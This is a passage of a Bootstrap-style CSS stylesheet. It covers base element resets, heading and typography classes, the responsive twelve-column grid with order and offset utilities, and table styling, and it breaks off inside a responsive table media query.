      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      font-size: 1rem;
      font-weight: 400;
      line-height: 1.5;
      color: #212529;
      text-align: left;
      background-color: #fff
    }

    [tabindex="-1"]:focus {
      outline: 0 !important
    }

    hr {
      box-sizing: content-box;
      height: 0;
      overflow: visible
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      margin-top: 0;
      margin-bottom: .5rem
    }

    p {
      margin-top: 0;
      margin-bottom: 1rem
    }

    abbr[data-original-title],
    abbr[title] {
      text-decoration: underline;
      -webkit-text-decoration: underline dotted;
      text-decoration: underline dotted;
      cursor: help;
      border-bottom: 0
    }

    address {
      margin-bottom: 1rem;
      font-style: normal;
      line-height: inherit
    }

    dl,
    ol,
    ul {
      margin-top: 0;
      margin-bottom: 1rem
    }

    ol ol,
    ol ul,
    ul ol,
    ul ul {
      margin-bottom: 0
    }

    dt {
      font-weight: 700
    }

    dd {
      margin-bottom: .5rem;
      margin-left: 0
    }

    blockquote {
      margin: 0 0 1rem
    }

    dfn {
      font-style: italic
    }

    b,
    strong {
      font-weight: bolder
    }

    small {
      font-size: 80%
    }

    sub,
    sup {
      position: relative;
      font-size: 75%;
      line-height: 0;
      vertical-align: baseline
    }

    sub {
      bottom: -.25em
    }

    sup {
      top: -.5em
    }

    a {
      color: #007bff;
      text-decoration: none;
      background-color: transparent;
      -webkit-text-decoration-skip: objects
    }

    a:hover {
      color: #0056b3;
      text-decoration: underline
    }

    a:not([href]):not([tabindex]) {
      color: inherit;
      text-decoration: none
    }

    a:not([href]):not([tabindex]):focus,
    a:not([href]):not([tabindex]):hover {
      color: inherit;
      text-decoration: none
    }

    a:not([href]):not([tabindex]):focus {
      outline: 0
    }

    code,
    kbd,
    pre,
    samp {
      font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      font-size: 1em
    }

    pre {
      margin-top: 0;
      margin-bottom: 1rem;
      overflow: auto;
      -ms-overflow-style: scrollbar
    }

    figure {
      margin: 0 0 1rem
    }

    img {
      vertical-align: middle;
      border-style: none
    }

    svg {
      overflow: hidden;
      vertical-align: middle
    }

    table {
      border-collapse: collapse
    }

    caption {
      padding-top: .75rem;
      padding-bottom: .75rem;
      color: #6c757d;
      text-align: left;
      caption-side: bottom
    }

    th {
      text-align: inherit
    }

    label {
      display: inline-block;
      margin-bottom: .5rem
    }

    button {
      border-radius: 0
    }

    button:focus {
      outline: 1px dotted;
      outline: 5px auto -webkit-focus-ring-color
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      margin: 0;
      font-family: inherit;
      font-size: inherit;
      line-height: inherit
    }

    button,
    input {
      overflow: visible
    }

    button,
    select {
      text-transform: none
    }

    [type=reset],
    [type=submit],
    button,
    html [type=button] {
      -webkit-appearance: button
    }

    [type=button]::-moz-focus-inner,
    [type=reset]::-moz-focus-inner,
    [type=submit]::-moz-focus-inner,
    button::-moz-focus-inner {
      padding: 0;
      border-style: none
    }

    input[type=checkbox],
    input[type=radio] {
      box-sizing: border-box;
      padding: 0
    }

    input[type=date],
    input[type=datetime-local],
    input[type=month],
    input[type=time] {
      -webkit-appearance: listbox
    }

    textarea {
      overflow: auto;
      resize: vertical
    }

    fieldset {
      min-width: 0;
      padding: 0;
      margin: 0;
      border: 0
    }

    legend {
      display: block;
      width: 100%;
      max-width: 100%;
      padding: 0;
      margin-bottom: .5rem;
      font-size: 1.5rem;
      line-height: inherit;
      color: inherit;
      white-space: normal
    }

    progress {
      vertical-align: baseline
    }

    [type=number]::-webkit-inner-spin-button,
    [type=number]::-webkit-outer-spin-button {
      height: auto
    }

    [type=search] {
      outline-offset: -2px;
      -webkit-appearance: none
    }

    [type=search]::-webkit-search-cancel-button,
    [type=search]::-webkit-search-decoration {
      -webkit-appearance: none
    }

    ::-webkit-file-upload-button {
      font: inherit;
      -webkit-appearance: button
    }

    output {
      display: inline-block
    }

    summary {
      display: list-item;
      cursor: pointer
    }

    template {
      display: none
    }

    [hidden] {
      display: none !important
    }

    .h1,
    .h2,
    .h3,
    .h4,
    .h5,
    .h6,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      margin-bottom: .5rem;
      font-family: inherit;
      font-weight: 500;
      line-height: 1.2;
      color: inherit
    }

    .h1,
    h1 {
      font-size: 2.5rem
    }

    .h2,
    h2 {
      font-size: 2rem
    }

    .h3,
    h3 {
      font-size: 1.75rem
    }

    .h4,
    h4 {
      font-size: 1.5rem
    }

    .h5,
    h5 {
      font-size: 1.25rem
    }

    .h6,
    h6 {
      font-size: 1rem
    }

    .lead {
      font-size: 1.25rem;
      font-weight: 300
    }

    .display-1 {
      font-size: 6rem;
      font-weight: 300;
      line-height: 1.2
    }

    .display-2 {
      font-size: 5.5rem;
      font-weight: 300;
      line-height: 1.2
    }

    .display-3 {
      font-size: 4.5rem;
      font-weight: 300;
      line-height: 1.2
    }

    .display-4 {
      font-size: 3.5rem;
      font-weight: 300;
      line-height: 1.2
    }

    hr {
      margin-top: 1rem;
      margin-bottom: 1rem;
      border: 0;
      border-top: 1px solid rgba(0, 0, 0, .1)
    }

    .small,
    small {
      font-size: 80%;
      font-weight: 400
    }

    .mark,
    mark {
      padding: .2em;
      background-color: #fcf8e3
    }

    .list-unstyled {
      padding-left: 0;
      list-style: none
    }

    .list-inline {
      padding-left: 0;
      list-style: none
    }

    .list-inline-item {
      display: inline-block
    }

    .list-inline-item:not(:last-child) {
      margin-right: .5rem
    }

    .initialism {
      font-size: 90%;
      text-transform: uppercase
    }

    .blockquote {
      margin-bottom: 1rem;
      font-size: 1.25rem
    }

    .blockquote-footer {
      display: block;
      font-size: 80%;
      color: #6c757d
    }

    .blockquote-footer::before {
      content: "\2014 \00A0"
    }

    .img-fluid {
      max-width: 100%;
      height: auto
    }

    .img-thumbnail {
      padding: .25rem;
      background-color: #fff;
      border: 1px solid #dee2e6;
      border-radius: .25rem;
      max-width: 100%;
      height: auto
    }

    .figure {
      display: inline-block
    }

    .figure-img {
      margin-bottom: .5rem;
      line-height: 1
    }

    .figure-caption {
      font-size: 90%;
      color: #6c757d
    }

    code {
      font-size: 87.5%;
      color: #e83e8c;
      word-break: break-word
    }

    a>code {
      color: inherit
    }

    kbd {
      padding: .2rem .4rem;
      font-size: 87.5%;
      color: #fff;
      background-color: #212529;
      border-radius: .2rem
    }

    kbd kbd {
      padding: 0;
      font-size: 100%;
      font-weight: 700
    }

    pre {
      display: block;
      font-size: 87.5%;
      color: #212529
    }

    pre code {
      font-size: inherit;
      color: inherit;
      word-break: normal
    }

    .pre-scrollable {
      max-height: 340px;
      overflow-y: scroll
    }

    .container {
      width: 100%;
      padding-right: 15px;
      padding-left: 15px;
      margin-right: auto;
      margin-left: auto
    }

    @media (min-width:576px) {
      .container {
        max-width: 540px
      }
    }

    @media (min-width:768px) {
      .container {
        max-width: 720px
      }
    }

    @media (min-width:992px) {
      .container {
        max-width: 960px
      }
    }

    @media (min-width:1200px) {
      .container {
        max-width: 1140px
      }
    }

    .container-fluid {
      width: 100%;
      padding-right: 15px;
      padding-left: 15px;
      margin-right: auto;
      margin-left: auto
    }

    .row {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      margin-right: -15px;
      margin-left: -15px
    }

    .no-gutters {
      margin-right: 0;
      margin-left: 0
    }

    .no-gutters>.col,
    .no-gutters>[class*=col-] {
      padding-right: 0;
      padding-left: 0
    }

    .col,
    .col-1,
    .col-10,
    .col-11,
    .col-12,
    .col-2,
    .col-3,
    .col-4,
    .col-5,
    .col-6,
    .col-7,
    .col-8,
    .col-9,
    .col-auto,
    .col-lg,
    .col-lg-1,
    .col-lg-10,
    .col-lg-11,
    .col-lg-12,
    .col-lg-2,
    .col-lg-3,
    .col-lg-4,
    .col-lg-5,
    .col-lg-6,
    .col-lg-7,
    .col-lg-8,
    .col-lg-9,
    .col-lg-auto,
    .col-md,
    .col-md-1,
    .col-md-10,
    .col-md-11,
    .col-md-12,
    .col-md-2,
    .col-md-3,
    .col-md-4,
    .col-md-5,
    .col-md-6,
    .col-md-7,
    .col-md-8,
    .col-md-9,
    .col-md-auto,
    .col-sm,
    .col-sm-1,
    .col-sm-10,
    .col-sm-11,
    .col-sm-12,
    .col-sm-2,
    .col-sm-3,
    .col-sm-4,
    .col-sm-5,
    .col-sm-6,
    .col-sm-7,
    .col-sm-8,
    .col-sm-9,
    .col-sm-auto,
    .col-xl,
    .col-xl-1,
    .col-xl-10,
    .col-xl-11,
    .col-xl-12,
    .col-xl-2,
    .col-xl-3,
    .col-xl-4,
    .col-xl-5,
    .col-xl-6,
    .col-xl-7,
    .col-xl-8,
    .col-xl-9,
    .col-xl-auto {
      position: relative;
      width: 100%;
      min-height: 1px;
      padding-right: 15px;
      padding-left: 15px
    }

    .col {
      -ms-flex-preferred-size: 0;
      flex-basis: 0;
      -ms-flex-positive: 1;
      flex-grow: 1;
      max-width: 100%
    }

    .col-auto {
      -ms-flex: 0 0 auto;
      flex: 0 0 auto;
      width: auto;
      max-width: none
    }

    .col-1 {
      -ms-flex: 0 0 8.333333%;
      flex: 0 0 8.333333%;
      max-width: 8.333333%
    }

    .col-2 {
      -ms-flex: 0 0 16.666667%;
      flex: 0 0 16.666667%;
      max-width: 16.666667%
    }

    .col-3 {
      -ms-flex: 0 0 25%;
      flex: 0 0 25%;
      max-width: 25%
    }

    .col-4 {
      -ms-flex: 0 0 33.333333%;
      flex: 0 0 33.333333%;
      max-width: 33.333333%
    }

    .col-5 {
      -ms-flex: 0 0 41.666667%;
      flex: 0 0 41.666667%;
      max-width: 41.666667%
    }

    .col-6 {
      -ms-flex: 0 0 50%;
      flex: 0 0 50%;
      max-width: 50%
    }

    .col-7 {
      -ms-flex: 0 0 58.333333%;
      flex: 0 0 58.333333%;
      max-width: 58.333333%
    }

    .col-8 {
      -ms-flex: 0 0 66.666667%;
      flex: 0 0 66.666667%;
      max-width: 66.666667%
    }

    .col-9 {
      -ms-flex: 0 0 75%;
      flex: 0 0 75%;
      max-width: 75%
    }

    .col-10 {
      -ms-flex: 0 0 83.333333%;
      flex: 0 0 83.333333%;
      max-width: 83.333333%
    }

    .col-11 {
      -ms-flex: 0 0 91.666667%;
      flex: 0 0 91.666667%;
      max-width: 91.666667%
    }

    .col-12 {
      -ms-flex: 0 0 100%;
      flex: 0 0 100%;
      max-width: 100%
    }

    .order-first {
      -ms-flex-order: -1;
      order: -1
    }

    .order-last {
      -ms-flex-order: 13;
      order: 13
    }

    .order-0 {
      -ms-flex-order: 0;
      order: 0
    }

    .order-1 {
      -ms-flex-order: 1;
      order: 1
    }

    .order-2 {
      -ms-flex-order: 2;
      order: 2
    }

    .order-3 {
      -ms-flex-order: 3;
      order: 3
    }

    .order-4 {
      -ms-flex-order: 4;
      order: 4
    }

    .order-5 {
      -ms-flex-order: 5;
      order: 5
    }

    .order-6 {
      -ms-flex-order: 6;
      order: 6
    }

    .order-7 {
      -ms-flex-order: 7;
      order: 7
    }

    .order-8 {
      -ms-flex-order: 8;
      order: 8
    }

    .order-9 {
      -ms-flex-order: 9;
      order: 9
    }

    .order-10 {
      -ms-flex-order: 10;
      order: 10
    }

    .order-11 {
      -ms-flex-order: 11;
      order: 11
    }

    .order-12 {
      -ms-flex-order: 12;
      order: 12
    }

    .offset-1 {
      margin-left: 8.333333%
    }

    .offset-2 {
      margin-left: 16.666667%
    }

    .offset-3 {
      margin-left: 25%
    }

    .offset-4 {
      margin-left: 33.333333%
    }

    .offset-5 {
      margin-left: 41.666667%
    }

    .offset-6 {
      margin-left: 50%
    }

    .offset-7 {
      margin-left: 58.333333%
    }

    .offset-8 {
      margin-left: 66.666667%
    }

    .offset-9 {
      margin-left: 75%
    }

    .offset-10 {
      margin-left: 83.333333%
    }

    .offset-11 {
      margin-left: 91.666667%
    }

    @media (min-width:576px) {
      .col-sm {
        -ms-flex-preferred-size: 0;
        flex-basis: 0;
        -ms-flex-positive: 1;
        flex-grow: 1;
        max-width: 100%
      }

      .col-sm-auto {
        -ms-flex: 0 0 auto;
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-sm-1 {
        -ms-flex: 0 0 8.333333%;
        flex: 0 0 8.333333%;
        max-width: 8.333333%
      }

      .col-sm-2 {
        -ms-flex: 0 0 16.666667%;
        flex: 0 0 16.666667%;
        max-width: 16.666667%
      }

      .col-sm-3 {
        -ms-flex: 0 0 25%;
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-sm-4 {
        -ms-flex: 0 0 33.333333%;
        flex: 0 0 33.333333%;
        max-width: 33.333333%
      }

      .col-sm-5 {
        -ms-flex: 0 0 41.666667%;
        flex: 0 0 41.666667%;
        max-width: 41.666667%
      }

      .col-sm-6 {
        -ms-flex: 0 0 50%;
        flex: 0 0 50%;
        max-width: 50%
      }

      .col-sm-7 {
        -ms-flex: 0 0 58.333333%;
        flex: 0 0 58.333333%;
        max-width: 58.333333%
      }

      .col-sm-8 {
        -ms-flex: 0 0 66.666667%;
        flex: 0 0 66.666667%;
        max-width: 66.666667%
      }

      .col-sm-9 {
        -ms-flex: 0 0 75%;
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-sm-10 {
        -ms-flex: 0 0 83.333333%;
        flex: 0 0 83.333333%;
        max-width: 83.333333%
      }

      .col-sm-11 {
        -ms-flex: 0 0 91.666667%;
        flex: 0 0 91.666667%;
        max-width: 91.666667%
      }

      .col-sm-12 {
        -ms-flex: 0 0 100%;
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-sm-first {
        -ms-flex-order: -1;
        order: -1
      }

      .order-sm-last {
        -ms-flex-order: 13;
        order: 13
      }

      .order-sm-0 {
        -ms-flex-order: 0;
        order: 0
      }

      .order-sm-1 {
        -ms-flex-order: 1;
        order: 1
      }

      .order-sm-2 {
        -ms-flex-order: 2;
        order: 2
      }

      .order-sm-3 {
        -ms-flex-order: 3;
        order: 3
      }

      .order-sm-4 {
        -ms-flex-order: 4;
        order: 4
      }

      .order-sm-5 {
        -ms-flex-order: 5;
        order: 5
      }

      .order-sm-6 {
        -ms-flex-order: 6;
        order: 6
      }

      .order-sm-7 {
        -ms-flex-order: 7;
        order: 7
      }

      .order-sm-8 {
        -ms-flex-order: 8;
        order: 8
      }

      .order-sm-9 {
        -ms-flex-order: 9;
        order: 9
      }

      .order-sm-10 {
        -ms-flex-order: 10;
        order: 10
      }

      .order-sm-11 {
        -ms-flex-order: 11;
        order: 11
      }

      .order-sm-12 {
        -ms-flex-order: 12;
        order: 12
      }

      .offset-sm-0 {
        margin-left: 0
      }

      .offset-sm-1 {
        margin-left: 8.333333%
      }

      .offset-sm-2 {
        margin-left: 16.666667%
      }

      .offset-sm-3 {
        margin-left: 25%
      }

      .offset-sm-4 {
        margin-left: 33.333333%
      }

      .offset-sm-5 {
        margin-left: 41.666667%
      }

      .offset-sm-6 {
        margin-left: 50%
      }

      .offset-sm-7 {
        margin-left: 58.333333%
      }

      .offset-sm-8 {
        margin-left: 66.666667%
      }

      .offset-sm-9 {
        margin-left: 75%
      }

      .offset-sm-10 {
        margin-left: 83.333333%
      }

      .offset-sm-11 {
        margin-left: 91.666667%
      }
    }

    @media (min-width:768px) {
      .col-md {
        -ms-flex-preferred-size: 0;
        flex-basis: 0;
        -ms-flex-positive: 1;
        flex-grow: 1;
        max-width: 100%
      }

      .col-md-auto {
        -ms-flex: 0 0 auto;
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-md-1 {
        -ms-flex: 0 0 8.333333%;
        flex: 0 0 8.333333%;
        max-width: 8.333333%
      }

      .col-md-2 {
        -ms-flex: 0 0 16.666667%;
        flex: 0 0 16.666667%;
        max-width: 16.666667%
      }

      .col-md-3 {
        -ms-flex: 0 0 25%;
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-md-4 {
        -ms-flex: 0 0 33.333333%;
        flex: 0 0 33.333333%;
        max-width: 33.333333%
      }

      .col-md-5 {
        -ms-flex: 0 0 41.666667%;
        flex: 0 0 41.666667%;
        max-width: 41.666667%
      }

      .col-md-6 {
        -ms-flex: 0 0 50%;
        flex: 0 0 50%;
        max-width: 50%
      }

      .col-md-7 {
        -ms-flex: 0 0 58.333333%;
        flex: 0 0 58.333333%;
        max-width: 58.333333%
      }

      .col-md-8 {
        -ms-flex: 0 0 66.666667%;
        flex: 0 0 66.666667%;
        max-width: 66.666667%
      }

      .col-md-9 {
        -ms-flex: 0 0 75%;
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-md-10 {
        -ms-flex: 0 0 83.333333%;
        flex: 0 0 83.333333%;
        max-width: 83.333333%
      }

      .col-md-11 {
        -ms-flex: 0 0 91.666667%;
        flex: 0 0 91.666667%;
        max-width: 91.666667%
      }

      .col-md-12 {
        -ms-flex: 0 0 100%;
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-md-first {
        -ms-flex-order: -1;
        order: -1
      }

      .order-md-last {
        -ms-flex-order: 13;
        order: 13
      }

      .order-md-0 {
        -ms-flex-order: 0;
        order: 0
      }

      .order-md-1 {
        -ms-flex-order: 1;
        order: 1
      }

      .order-md-2 {
        -ms-flex-order: 2;
        order: 2
      }

      .order-md-3 {
        -ms-flex-order: 3;
        order: 3
      }

      .order-md-4 {
        -ms-flex-order: 4;
        order: 4
      }

      .order-md-5 {
        -ms-flex-order: 5;
        order: 5
      }

      .order-md-6 {
        -ms-flex-order: 6;
        order: 6
      }

      .order-md-7 {
        -ms-flex-order: 7;
        order: 7
      }

      .order-md-8 {
        -ms-flex-order: 8;
        order: 8
      }

      .order-md-9 {
        -ms-flex-order: 9;
        order: 9
      }

      .order-md-10 {
        -ms-flex-order: 10;
        order: 10
      }

      .order-md-11 {
        -ms-flex-order: 11;
        order: 11
      }

      .order-md-12 {
        -ms-flex-order: 12;
        order: 12
      }

      .offset-md-0 {
        margin-left: 0
      }

      .offset-md-1 {
        margin-left: 8.333333%
      }

      .offset-md-2 {
        margin-left: 16.666667%
      }

      .offset-md-3 {
        margin-left: 25%
      }

      .offset-md-4 {
        margin-left: 33.333333%
      }

      .offset-md-5 {
        margin-left: 41.666667%
      }

      .offset-md-6 {
        margin-left: 50%
      }

      .offset-md-7 {
        margin-left: 58.333333%
      }

      .offset-md-8 {
        margin-left: 66.666667%
      }

      .offset-md-9 {
        margin-left: 75%
      }

      .offset-md-10 {
        margin-left: 83.333333%
      }

      .offset-md-11 {
        margin-left: 91.666667%
      }
    }

    @media (min-width:992px) {
      .col-lg {
        -ms-flex-preferred-size: 0;
        flex-basis: 0;
        -ms-flex-positive: 1;
        flex-grow: 1;
        max-width: 100%
      }

      .col-lg-auto {
        -ms-flex: 0 0 auto;
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-lg-1 {
        -ms-flex: 0 0 8.333333%;
        flex: 0 0 8.333333%;
        max-width: 8.333333%
      }

      .col-lg-2 {
        -ms-flex: 0 0 16.666667%;
        flex: 0 0 16.666667%;
        max-width: 16.666667%
      }

      .col-lg-3 {
        -ms-flex: 0 0 25%;
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-lg-4 {
        -ms-flex: 0 0 33.333333%;
        flex: 0 0 33.333333%;
        max-width: 33.333333%
      }

      .col-lg-5 {
        -ms-flex: 0 0 41.666667%;
        flex: 0 0 41.666667%;
        max-width: 41.666667%
      }

      .col-lg-6 {
        -ms-flex: 0 0 50%;
        flex: 0 0 50%;
        max-width: 50%
      }

      .col-lg-7 {
        -ms-flex: 0 0 58.333333%;
        flex: 0 0 58.333333%;
        max-width: 58.333333%
      }

      .col-lg-8 {
        -ms-flex: 0 0 66.666667%;
        flex: 0 0 66.666667%;
        max-width: 66.666667%
      }

      .col-lg-9 {
        -ms-flex: 0 0 75%;
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-lg-10 {
        -ms-flex: 0 0 83.333333%;
        flex: 0 0 83.333333%;
        max-width: 83.333333%
      }

      .col-lg-11 {
        -ms-flex: 0 0 91.666667%;
        flex: 0 0 91.666667%;
        max-width: 91.666667%
      }

      .col-lg-12 {
        -ms-flex: 0 0 100%;
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-lg-first {
        -ms-flex-order: -1;
        order: -1
      }

      .order-lg-last {
        -ms-flex-order: 13;
        order: 13
      }

      .order-lg-0 {
        -ms-flex-order: 0;
        order: 0
      }

      .order-lg-1 {
        -ms-flex-order: 1;
        order: 1
      }

      .order-lg-2 {
        -ms-flex-order: 2;
        order: 2
      }

      .order-lg-3 {
        -ms-flex-order: 3;
        order: 3
      }

      .order-lg-4 {
        -ms-flex-order: 4;
        order: 4
      }

      .order-lg-5 {
        -ms-flex-order: 5;
        order: 5
      }

      .order-lg-6 {
        -ms-flex-order: 6;
        order: 6
      }

      .order-lg-7 {
        -ms-flex-order: 7;
        order: 7
      }

      .order-lg-8 {
        -ms-flex-order: 8;
        order: 8
      }

      .order-lg-9 {
        -ms-flex-order: 9;
        order: 9
      }

      .order-lg-10 {
        -ms-flex-order: 10;
        order: 10
      }

      .order-lg-11 {
        -ms-flex-order: 11;
        order: 11
      }

      .order-lg-12 {
        -ms-flex-order: 12;
        order: 12
      }

      .offset-lg-0 {
        margin-left: 0
      }

      .offset-lg-1 {
        margin-left: 8.333333%
      }

      .offset-lg-2 {
        margin-left: 16.666667%
      }

      .offset-lg-3 {
        margin-left: 25%
      }

      .offset-lg-4 {
        margin-left: 33.333333%
      }

      .offset-lg-5 {
        margin-left: 41.666667%
      }

      .offset-lg-6 {
        margin-left: 50%
      }

      .offset-lg-7 {
        margin-left: 58.333333%
      }

      .offset-lg-8 {
        margin-left: 66.666667%
      }

      .offset-lg-9 {
        margin-left: 75%
      }

      .offset-lg-10 {
        margin-left: 83.333333%
      }

      .offset-lg-11 {
        margin-left: 91.666667%
      }
    }

    @media (min-width:1200px) {
      .col-xl {
        -ms-flex-preferred-size: 0;
        flex-basis: 0;
        -ms-flex-positive: 1;
        flex-grow: 1;
        max-width: 100%
      }

      .col-xl-auto {
        -ms-flex: 0 0 auto;
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-xl-1 {
        -ms-flex: 0 0 8.333333%;
        flex: 0 0 8.333333%;
        max-width: 8.333333%
      }

      .col-xl-2 {
        -ms-flex: 0 0 16.666667%;
        flex: 0 0 16.666667%;
        max-width: 16.666667%
      }

      .col-xl-3 {
        -ms-flex: 0 0 25%;
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-xl-4 {
        -ms-flex: 0 0 33.333333%;
        flex: 0 0 33.333333%;
        max-width: 33.333333%
      }

      .col-xl-5 {
        -ms-flex: 0 0 41.666667%;
        flex: 0 0 41.666667%;
        max-width: 41.666667%
      }

      .col-xl-6 {
        -ms-flex: 0 0 50%;
        flex: 0 0 50%;
        max-width: 50%
      }

      .col-xl-7 {
        -ms-flex: 0 0 58.333333%;
        flex: 0 0 58.333333%;
        max-width: 58.333333%
      }

      .col-xl-8 {
        -ms-flex: 0 0 66.666667%;
        flex: 0 0 66.666667%;
        max-width: 66.666667%
      }

      .col-xl-9 {
        -ms-flex: 0 0 75%;
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-xl-10 {
        -ms-flex: 0 0 83.333333%;
        flex: 0 0 83.333333%;
        max-width: 83.333333%
      }

      .col-xl-11 {
        -ms-flex: 0 0 91.666667%;
        flex: 0 0 91.666667%;
        max-width: 91.666667%
      }

      .col-xl-12 {
        -ms-flex: 0 0 100%;
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-xl-first {
        -ms-flex-order: -1;
        order: -1
      }

      .order-xl-last {
        -ms-flex-order: 13;
        order: 13
      }

      .order-xl-0 {
        -ms-flex-order: 0;
        order: 0
      }

      .order-xl-1 {
        -ms-flex-order: 1;
        order: 1
      }

      .order-xl-2 {
        -ms-flex-order: 2;
        order: 2
      }

      .order-xl-3 {
        -ms-flex-order: 3;
        order: 3
      }

      .order-xl-4 {
        -ms-flex-order: 4;
        order: 4
      }

      .order-xl-5 {
        -ms-flex-order: 5;
        order: 5
      }

      .order-xl-6 {
        -ms-flex-order: 6;
        order: 6
      }

      .order-xl-7 {
        -ms-flex-order: 7;
        order: 7
      }

      .order-xl-8 {
        -ms-flex-order: 8;
        order: 8
      }

      .order-xl-9 {
        -ms-flex-order: 9;
        order: 9
      }

      .order-xl-10 {
        -ms-flex-order: 10;
        order: 10
      }

      .order-xl-11 {
        -ms-flex-order: 11;
        order: 11
      }

      .order-xl-12 {
        -ms-flex-order: 12;
        order: 12
      }

      .offset-xl-0 {
        margin-left: 0
      }

      .offset-xl-1 {
        margin-left: 8.333333%
      }

      .offset-xl-2 {
        margin-left: 16.666667%
      }

      .offset-xl-3 {
        margin-left: 25%
      }

      .offset-xl-4 {
        margin-left: 33.333333%
      }

      .offset-xl-5 {
        margin-left: 41.666667%
      }

      .offset-xl-6 {
        margin-left: 50%
      }

      .offset-xl-7 {
        margin-left: 58.333333%
      }

      .offset-xl-8 {
        margin-left: 66.666667%
      }

      .offset-xl-9 {
        margin-left: 75%
      }

      .offset-xl-10 {
        margin-left: 83.333333%
      }

      .offset-xl-11 {
        margin-left: 91.666667%
      }
    }

    .table {
      width: 100%;
      margin-bottom: 1rem;
      background-color: transparent
    }

    .table td,
    .table th {
      padding: .75rem;
      vertical-align: top;
      border-top: 1px solid #dee2e6
    }

    .table thead th {
      vertical-align: bottom;
      border-bottom: 2px solid #dee2e6
    }

    .table tbody+tbody {
      border-top: 2px solid #dee2e6
    }

    .table .table {
      background-color: #fff
    }

    .table-sm td,
    .table-sm th {
      padding: .3rem
    }

    .table-bordered {
      border: 1px solid #dee2e6
    }

    .table-bordered td,
    .table-bordered th {
      border: 1px solid #dee2e6
    }

    .table-bordered thead td,
    .table-bordered thead th {
      border-bottom-width: 2px
    }

    .table-borderless tbody+tbody,
    .table-borderless td,
    .table-borderless th,
    .table-borderless thead th {
      border: 0
    }

    .table-striped tbody tr:nth-of-type(odd) {
      background-color: rgba(0, 0, 0, .05)
    }

    .table-hover tbody tr:hover {
      background-color: rgba(0, 0, 0, .075)
    }

    .table-primary,
    .table-primary>td,
    .table-primary>th {
      background-color: #b8daff
    }

    .table-hover .table-primary:hover {
      background-color: #9fcdff
    }

    .table-hover .table-primary:hover>td,
    .table-hover .table-primary:hover>th {
      background-color: #9fcdff
    }

    .table-secondary,
    .table-secondary>td,
    .table-secondary>th {
      background-color: #d6d8db
    }

    .table-hover .table-secondary:hover {
      background-color: #c8cbcf
    }

    .table-hover .table-secondary:hover>td,
    .table-hover .table-secondary:hover>th {
      background-color: #c8cbcf
    }

    .table-success,
    .table-success>td,
    .table-success>th {
      background-color: #c3e6cb
    }

    .table-hover .table-success:hover {
      background-color: #b1dfbb
    }

    .table-hover .table-success:hover>td,
    .table-hover .table-success:hover>th {
      background-color: #b1dfbb
    }

    .table-info,
    .table-info>td,
    .table-info>th {
      background-color: #bee5eb
    }

    .table-hover .table-info:hover {
      background-color: #abdde5
    }

    .table-hover .table-info:hover>td,
    .table-hover .table-info:hover>th {
      background-color: #abdde5
    }

    .table-warning,
    .table-warning>td,
    .table-warning>th {
      background-color: #ffeeba
    }

    .table-hover .table-warning:hover {
      background-color: #ffe8a1
    }

    .table-hover .table-warning:hover>td,
    .table-hover .table-warning:hover>th {
      background-color: #ffe8a1
    }

    .table-danger,
    .table-danger>td,
    .table-danger>th {
      background-color: #f5c6cb
    }

    .table-hover .table-danger:hover {
      background-color: #f1b0b7
    }

    .table-hover .table-danger:hover>td,
    .table-hover .table-danger:hover>th {
      background-color: #f1b0b7
    }

    .table-light,
    .table-light>td,
    .table-light>th {
      background-color: #fdfdfe
    }

    .table-hover .table-light:hover {
      background-color: #ececf6
    }

    .table-hover .table-light:hover>td,
    .table-hover .table-light:hover>th {
      background-color: #ececf6
    }

    .table-dark,
    .table-dark>td,
    .table-dark>th {
      background-color: #c6c8ca
    }

    .table-hover .table-dark:hover {
      background-color: #b9bbbe
    }

    .table-hover .table-dark:hover>td,
    .table-hover .table-dark:hover>th {
      background-color: #b9bbbe
    }

    .table-active,
    .table-active>td,
    .table-active>th {
      background-color: rgba(0, 0, 0, .075)
    }

    .table-hover .table-active:hover {
      background-color: rgba(0, 0, 0, .075)
    }

    .table-hover .table-active:hover>td,
    .table-hover .table-active:hover>th {
      background-color: rgba(0, 0, 0, .075)
    }

    .table .thead-dark th {
      color: #fff;
      background-color: #212529;
      border-color: #32383e
    }

    .table .thead-light th {
      color: #495057;
      background-color: #e9ecef;
      border-color: #dee2e6
    }

    .table-dark {
      color: #fff;
      background-color: #212529
    }

    .table-dark td,
    .table-dark th,
    .table-dark thead th {
      border-color: #32383e
    }

    .table-dark.table-bordered {
      border: 0
    }

    .table-dark.table-striped tbody tr:nth-of-type(odd) {
      background-color: rgba(255, 255, 255, .05)
    }

    .table-dark.table-hover tbody tr:hover {
      background-color: rgba(255, 255, 255, .075)
    }

    @media (max-width:575.98px) {
      .table-responsive-sm {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
        -ms-overflow-style: -ms-autohiding-scrollbar
      }

      .table-responsive-sm>.table-bordered {
        border: 0
      }
    }

    @media (max-width:767.98px) {
      .table-responsive-md {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
        -ms-overflow-style: -ms-autohiding-scrollbar
      }

      .table-responsive-md>.table-bordered {
        border: 0
      }
    }

    @media (max-width:991.98px) {
      .table-responsive-lg {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
